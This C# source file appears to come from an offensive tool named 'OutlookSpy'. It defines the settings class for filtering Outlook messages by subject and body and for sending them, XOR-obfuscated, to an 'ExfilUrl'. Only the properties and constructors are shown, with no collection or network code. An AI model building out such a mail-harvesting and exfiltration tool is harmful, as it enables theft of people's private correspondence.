using System.Data;
using Outlook = Microsoft.Office.Interop.Outlook;

namespace OutlookSpy
{
	class App
	{
		public DataSet OutlookDataSet { get; set; }
		public string EntryId { get; set; }
		public long MaxRecords { get; set; }
		public string BodyContains { get; set; }
		public string BodyContainsRegex { get; set; }
		public string SubjectContainsRegex { get; set; }
		public string SubjectContains { get; set; }
		public long MaxMessageSize { get; set; }
		public string OutputFormat { get; set; }
		public string ExfilUrl { get; set; }
		public string XorKey { get; set; }
		public Outlook.Application OutlookApplication { get; private set; }
		public Outlook.NameSpace OutlookNameSpace { get; private set; }

		public App()
		{
			OutlookDataSet = new DataSet();
			OutlookApplication = new Outlook.Application();
			OutlookNameSpace = OutlookApplication.GetNamespace("MAPI");
		}

		public App(string entryId, long maxRecords, string bodyContains, string bodyContainsRegex, string subjectBegins, string subjectContians, string subjectEquals, long maxMessageSize, string outputFormat, string exfilUrl, string xorKey)
		{
			OutlookDataSet = new DataSet();
			EntryId = entryId;
			MaxRecords = maxRecords;
			BodyContains = bodyContains;
			BodyContainsRegex = bodyContainsRegex;
			SubjectContainsRegex = subjectBegins;
			SubjectContains = subjectContians;
			MaxMessageSize = maxMessageSize;
			OutputFormat = outputFormat;
			ExfilUrl = exfilUrl;
			XorKey = xorKey;
		}
	}
}
